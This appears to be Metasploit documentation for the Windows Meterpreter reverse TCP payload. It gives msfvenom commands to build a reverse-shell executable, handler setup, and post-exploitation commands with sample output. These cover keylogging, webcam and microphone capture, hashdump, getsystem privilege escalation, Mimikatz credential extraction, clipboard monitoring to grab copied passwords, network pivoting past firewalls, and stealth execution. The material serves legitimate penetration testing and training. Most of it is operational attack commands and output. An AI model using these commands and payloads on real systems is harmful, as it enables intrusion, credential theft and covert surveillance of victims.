windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has
to offer, and there are so many things you can do with it.

It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting,
control the webcam and microphone, etc. It has the best support for post modules, and you can
load extensions, such as mimikatz and python interpreter, etc.

windows/meterpreter/reverse_tcp is also the default payload for all Windows exploit targets.

## Vulnerable Application

This Meterpreter payload is suitable for the following environments:

* Windows x64
* Windows x86

## Verification Steps

windows/meterpreter/reverse_tcp is typically used in two different ways.

First, it is typically used as a payload for an exploit. Here's how to do that:

1. In msfconsole, select an exploit module
2. Configure the options for that exploit.
3. Do: ```set payload windows/meterpreter/reverse_tcp```
4. Set the ```LHOST``` option, which is the IP that the payload should connect to.
5. Do: ```exploit```. If the exploit is successful, it should execute that payload.

Another way to use windows/meterpreter/reverse_tcp is to generate it as an executable. Normally,
you would want to do it with msfvenom. If you are old school, you have probably also heard of
msfpayload and msfencode. msfvenom is a replacement of those.

The following is a basic example of using msfvenom to to generate windows/meterpreter/reverse_tcp
as an executable:

```
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o /tmp/payload.exe
```

## Important Basic Commands

**pwd command**

The ```pwd``` command allows you to see the current directory you're in on the remote target.
Example:

```
meterpreter > pwd
C:\Users\user\Desktop
```

**cd command**

The ```cd``` command allows you to change directories. Example:

```
meterpreter > cd C:\\
meterpreter > pwd
C:\
```

**cat command**

The ```cat``` command allows you to see the content of a file:

```
meterpreter > cat C:\\file.txt
Hello world!
```

**upload command**

The ```upload``` command allows you to upload a file to the remote target. For example:

```
meterpreter > upload /tmp/something.txt C:\\Users\\user\\Desktop\\something.txt
[*] uploading  : /tmp/something.txt -> C:\Users\user\Desktop\something.txt
[*] uploaded   : /tmp/something.txt -> C:\Users\user\Desktop\something.txt
meterpreter >
```

The ```-r``` option for the command also allows you to upload recursively.

**download command**

The ```download``` command allows you download a file from the remote target to your machine.
For example:

```
meterpreter > download C:\\Users\\user\\Desktop\\something.txt /tmp/
[*] downloading: C:\Users\user\Desktop\something.txt -> /tmp//something.txt
[*] download   : C:\Users\user\Desktop\something.txt -> /tmp//something.txt
meterpreter >
```

The ```-r``` option for the command also allows you to download recursively.

**search command**

The ```search``` command allows you to find files on the remote file system. For example, this
demonstrates how to find all text files in the current directory:

```
meterpreter > search -d . -f *.txt
Found 1 result...
    .\something.txt (5 bytes)
```

Note that without the ```-d``` option, the command will attempt to search in all drives.

The ```-r``` option for the commands allows you to search recursively.

**ifconfig command**

The ```ifconfig``` command displays the network interfaces on the remote machine:

```
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
...
```

The command ```ipconfig``` is an alias for ```ifconfig```.

**getuid command**

The ```getuid``` command shows you the current user that the payload is running as:

```
meterpreter > getuid
Server username: WIN-6NH0Q8CJQVM\user
```

**execute command**

The ```execute``` command allows you to execute a command or file on the remote machine.

The following example will spawn a calculator:

```
meterpreter > execute -f calc.exe
Process 2076 created.
```

To pass an argument, use the ```-a``` flag:

```
meterpreter > execute -f iexplore.exe -a https://metasploit.com
Process 2016 created.
```

There are some options you can see to add more stealth. For example, you can use the ```-H``` flag
to create the process hidden from view. You can also use the ```-m``` flag to execute from memory.

**ps command**

The ```ps``` command lists the running processes on the remote machine.

**shell command**

The ```shell``` command allows you to interact with the remote machine's command prompt. Example:

```
meterpreter > shell
Process 3576 created.
Channel 6 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user\Desktop>
```

To switch back to Meterpreter, do [CTRL]+[Z] to background the channel.

**sysinfo command**

The ```sysinfo``` command shows you basic information about the remote machine. Example:

```
meterpreter > sysinfo
Computer        : WIN-6NH0Q8CJQVM
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >
```

**keyscan_start**

The ```keyscan_start``` command starts the keylogging feature on the remote machine.

**keyscan_dump**

The ```keyscan_dump``` command is a keylogger feature. You must use the ```keyscan_start``` command
before using this. Example:

```
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
Hello World!!
```

If you wish to stop sniffing, use the ```keyscan_stop``` command.

**keyscan_stop**

The ```keyscan_stop``` command stops the keylogger.

**screenshot**

The ```screenshot``` command takes a screenshot of the target machine.

**webcam_list**

The ```webcam_list``` commands shows you a list of webcams that you can control. You'll
probably want to use this first before using any other webcam commands.

**webcam_snap**

The ```webcam_snap``` commands uses the selected webcam to take a picture.

**webcam_stream**

The ```webcam_stream``` command basically uses the ```webcam_snap``` command repeatedly to create
the streaming effect. There is no sound.

**record_mic**

The ```record_mic``` command captures audio on the remote machine.

**getsystem**

The ```getsystem``` command attempts to elevate your privilege on the remote machine with one of
these techniques:

* Named pipe impersonation (in memory)
* Named pipe impersonation (dropper)
* Token duplication (in memory)

Example:

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

**hashdump**

The ```hashdump``` commands allows you to dump the Windows hashes if there are the right privileges.
For sxample:

```
meterpreter > hashdump
Administrator:500:e39baff0f2c5fd4e93e28745b8bf4ba6:f4974ee4a935ee160a927eafbb3f317f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:92a84e332fa4b09e9850257ad6826566:8fb9a6e155fd6e14a16c37427b68bbb4:::
root:1003:633c097a37b26c0caad3b435b51404ee:f2477a144dff4f216ab81f2ac3e3207d:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:e09fcdea29d93203c925b205640421f2:::
```


## Scenarios

**Setting up for Testing**

For testing purposes, if you don't want to manually generate a payload and start a multi handler
repeatedly, you can use the auto_win32_multihandler.rc resource script in Metasploit to automate that process. Here's how you would use it:

First, run the resource script:

```
$ ./msfconsole -q -r scripts/resource/auto_win32_multihandler.rc
[*] Processing scripts/resource/auto_win32_multihandler.rc for ERB directives.
[*] resource (scripts/resource/auto_win32_multihandler.rc)> Ruby Code (776 bytes)
lhost => 192.168.1.199
lport => 4444
[*] Writing 73802 bytes to /Users/metasploit/.msf4/local/meterpreter_reverse_tcp.exe...
[*] windows/meterpreter/reverse_tcp's LHOST=192.168.1.199, LPORT=4444
[*] windows/meterpreter/reverse_tcp is at /Users/metasploit/.msf4/local/meterpreter_reverse_tcp.exe
payload => windows/meterpreter/reverse_tcp
lhost => 192.168.1.199
lport => 4444
exitonsession => false
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.1.199:4444
[*] Starting the payload handler...
msf exploit(handler) >
```

Next, go to your ~/.msf4/local directory, you should see meterpreter_reverse_tcp.exe in there.
Upload that payload to your test box and execute it. You should receive a connection.

**Using a Post Module**

One of the best things about Meterpreter is you have access to a variety of post exploitation
modules, specifically for the multi and Windows categories. Post modules provide you with more capabilities to
collect data from the remote machine automatically. For example, you can steal passwords
from popular applications and enumerate or modify system settings.

To use a post module from the Meterpreter prompt, simply use the ```run``` command:

```
meterpreter > run post/windows/gather/checkvm

[*] Checking if WIN-6NH0Q8CJQVM is a Virtual Machine .....
[*] This is a VMware Virtual Machine
meterpreter >
```

It is also possible to run a post module via multiple Meterpreter sessions. To learn how, load
the specific post module you wish to run, and enter ```info -d``` to see the basic usage in the
documentation.


**Using the Mimikatz Extension**

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well known tool to extract passwords, hashes, PIN code, and kerberos tickets from memory on Windows. This might actually be the first thing you want to use as soon as you get a high-privileged session, such as SYSTEM.

To begin, load the extension:

```
meterpreter > load mimikatz
Loading extension mimikatz...success.
meterpreter >
```

This will create more commands for the Meterpreter prompt. Most of them are meant to be used to
retrieve user names, hashes, passwords and other information:

```
Mimikatz Commands
=================

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom command
    msv               Attempt to retrieve msv creds (hashes)
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds
```

An example of using the ```msv``` command:

```
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0;313876  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
0;313828  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
0;996     Negotiate  WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;45518   NTLM                                          n.s. (Credentials KO)
0;999     NTLM       WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
```


**Using the extapi Extension**

The main purpose of the extapi extension is to perform advanced enumeration of the target machine. For
example, you can enumerate things like registered services, open windows, clipboard, ADSI, WMI queries, etc.

To begin, at the Meterpreter prompt, do:

```
meterpreter > load extapi
Loading extension extapi...success.
meterpreter >
```

One great feature of the extension is clipboard management. The Windows clipboard is interesting
because it can store anything that is sensitive, such as files, user names, and passwords, but it is not well protected.

For example, a password manager is a popular tool to store encryped passwords. It allows the user
to create complex passwords without the need to memorize any of them. All the user needs to do is
open the password manager, retrieve the password for a particular account by copying it, and then
paste it on a login page.

There is a security problem to the above process. When the user copies the password, it is stored
in the operating system's clipboard. As an attacker, you can take advantage of this by starting the
clipboard monitor from Meterpreter/extapi, and then collect whatever the user copies.

To read whatever is currently stored in the target's clipboard, you can use the clipboard_get_data
commnad:

```
meterpreter > clipboard_get_data
Text captured at 2016-03-05 19:13:39.0170
=========================================
hello, world!!
=========================================

meterpreter >
```

The limitation of this command is that since you're only grabbing whatever is in the clipboard at
the time, there is only one item to collect. However, when you start a monitor, you can collect
whatever goes in there. To start, issue the following command:

```
meterpreter > clipboard_monitor_start
[+] Clipboard monitor started
meterpreter >
```

While it is monitoring, you can ask Meterpreter to dump whatever's been captured.

```
meterpreter > clipboard_monitor_dump
Text captured at 2016-03-05 19:18:18.0466
=========================================
this is fun.
=========================================

Files captured at 2016-03-05 19:20:07.0525
==========================================
Remote Path : C:\Users\user\Desktop\cat_pic.png
File size   : 37627 bytes
downloading : C:\Users\user\Desktop\cat_pic.png -> ./cat_pic.png
download    : C:\Users\user\Desktop\cat_pic.png -> ./cat_pic.png

==========================================

[+] Clipboard monitor dumped
meterpreter >
```

The ```clipboard_monitor_stop``` command will also dump the captured data, and then exit.

Combined with Meterpreter's keylogger, you have a very effective setup to capture the user's
inputs.


**Using the Python Extension**

The Python extension allows you to use the remote machine's Python interpreter.

To load the extension, at the Meterpreter prompt, do:

```
meterpreter > use python
Loading extension python...success.
```

The most basic example of using the interpreter is the ```python_execute``` command:

```
meterpreter > python_execute "x = 'hello world'; print x"
[+] Content written to stdout:
hello world

meterpreter >
```

Another way to execute Python code is from a local file by using the ```python_import``` command.

To do this, first prepare for a Python script. This example should create a message.txt on the
remote machine's desktop:


```python
import os

user_profile = os.environ['USERPROFILE']

f = open(user_profile + '\\Desktop\\message.txt', 'w+')
f.write('hello world!')
f.close()
```

And to run that with the command:

```
meterpreter > python_import -f /tmp/test.py
[*] Importing /tmp/test.py ...
[+] Command executed without returning a result
meterpreter >
```

To learn more about the Python extension, please read this [wiki](https://github.com/rapid7/metasploit-framework/wiki/Python-Extension).

**Network Pivoting**

There are three mains ways that you can use for moving around inside a network:

 - The route command in the msf prompt
 - The route command in the the Meterpreter prompt
 - The portfwd command

***Routing through msfconsole***

The route command from the msf prompt allows you connect to hosts on a different network through the compromised machine. You should be able to determine that by looking at the compromised machine's ipconfig:

```
[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.201:49182) at 2016-03-04 20:35:31 -0600

meterpreter > ipconfig
...
Interface 10
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:86:4b:0d
MTU          : 1472
IPv4 Address : 192.168.1.201
IPv4 Netmask : 255.255.255.0
IPv6 Address : 2602:30a:2c51:e660::20
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : 2602:30a:2c51:e660:44a:576e:3d2c:d765
IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : 2602:30a:2c51:e660:94be:567f:4fe7:5da7
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : fe80::44a:576e:3d2c:d765
IPv6 Netmask : ffff:ffff:ffff:ffff::

...

Interface 26
============
Name         : VPN
Hardware MAC : 00:00:00:00:00:00
MTU          : 1400
IPv4 Address : 192.100.0.100
IPv4 Netmask : 255.255.255.255

...
```

The example above shows that we have a Meterpreter connection to 192.168.1.201. Let's call this box A, and it  is connected to the 192.100.0.0/24 VPN network. As an attacker, we aren't connected to this network directly, but we can explore that network through box A.

At the msf prompt, do:

```
msf exploit(handler) > route add 192.100.0.0 255.255.255.0 1
[*] Route added
```

The  ```1``` at the end of the route indicates the session ID, the payload that is used as a gateway to talk to other machines.

So right now, we have a connection established to the VPN, and we should be able to connect to another machine from that network:

```
msf auxiliary(smb_version) > run

[*] 192.100.0.101:445     - 192.100.0.101:445 is running Windows 2003 SP2 (build:3790) (name:SINN3R-QIXN9TA2) (domain:WORKGROUP)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_version) >
```

Another neat trick using route is that you can also bypass the compromised host's firewall this way. For example, if the host has HTTP open, but SMB is blocked by the firewall, you can try to compromise it via HTTP first. You'll need to use the route command to talk to SMB and then try to exploit SMB.

***Routing through Meterpreter***

The route command in Meterpreter allows you change the routing table that is on the target machine. The way it needs to be configured is similar to the route command in msfconsole.

***Routing through the portfwd command***

The portfwd command allows you to talk to a remote service like it's local. For example, if you are able to compromise a host via SMB, but are not able to connect to the remote desktop service, then you can do:

```
meterpreter > portfwd add –l 3389 –p 3389 –r [Target Host]
```

And that should allow you to connect to remote desktop this way on the attacker's box:

```
rdesktop 127.0.0.1
```

**Meterpreter Paranoid Mode**

The paranoid mode forces the handler to be strict about which Meterpreter should be connecting to it, hence the name "paranoid mode".

To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode).

**Meterpreter Reliable Network Communication**

Exiting Metasploit using ```exit -y``` no longer terminates the payload session like it used to. Instead, it will continue to run behind the scenes, attempting to connect back to Metasploit when an appropriate handler is available. If you wish to exit the session, make sure to ```sessions -K``` first.

To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication).

**Meterpreter Sleep Control**

The sleep mode allows the payload on the target machine to be quiet for awhile, mainly in order to avoid suspicious active communication. It also provides better efficiency.

It is very simple to use. At the Meterpreter prompt, simply do:

```
meterpreter > sleep 20
```

And that will allow Meterpreter to sleep 20 seconds, and will reconnect as long as the payload
handler remains active (such as being a background job).

To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Sleep-Control).

**Meterpreter Stageless Mode**

A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a normal one would actually cost too much time and bandwidth in a penetration test. To learn more about this, [click on this](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode) to read more.

To use the stageless payload, use ```windows/meterpreter_reverse_tcp``` instead.

**Meterpreter Timeout Control**

The timeout control basically defines the life span of Meterpreter. To configure it, use the
```set_timeouts``` command:

```
meterpreter > set_timeouts
Usage: set_timeouts [options]

Set the current timeout options.
Any or all of these can be set at once.

OPTIONS:

    -c <opt>  Comms timeout (seconds)
    -h        Help menu
    -t <opt>  Retry total time (seconds)
    -w <opt>  Retry wait time (seconds)
    -x <opt>  Expiration timout (seconds)
```

To see the current timeout configuration, you can use the ```get_timeouts``` command:

```
meterpreter > get_timeouts
Session Expiry  : @ 2016-03-11 21:15:58
Comm Timeout    : 300 seconds
Retry Total Time: 3600 seconds
Retry Wait Time : 10 seconds
```

To learn more about timeout control, please [go here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control).

**Meterpreter Transport Control**

Transport Control allows you manage transports on the fly while the payload session is still running. Meterpreter can automatically cycle through the transports when communication fails, or you can do it manually.

To learn more about this, please read this [documentation](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control).


## Using the Post Exploitation API in IRB

To enter IRB, do the following at the Meterpreter prompt:

```
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>>
```

**The client object**

The client object in Meterpreter's IRB allows you control or retrieve information about the host. For example, this demonstrates how to obtain the current privilege we're running the payload as:

```ruby
>> client.sys.config.getuid
```

To explore the client object, there are a few tricks. For example, you can use the #inspect method to inspect it:

```
>> client.inspect
```

You can use the #methods method to see what methods you can use:

```
>> client.methods
```

To find the source of the method, you can use the #source_location method. For example, say I want to find the source code for the #getuid method:

```
>> client.sys.config.method(:getuid).source_location
=> ["/Users/user/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb", 32]
```

The first element of the array is the location of the file. The second element is the line number of the method.

**Using Railgun**

Railgun allows you to use the remote machine's Windows API in Ruby. For example, to create a MessageBox on the target machine, do:

```
>> client.railgun.user32.MessageBoxA(0, "hello, world", "hello", "MB_OK")
=> {"GetLastError"=>0, "ErrorMessage"=>"The operation completed successfully.", "return"=>1}
```

To learn more about using Railgun, please read this [wiki](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation).

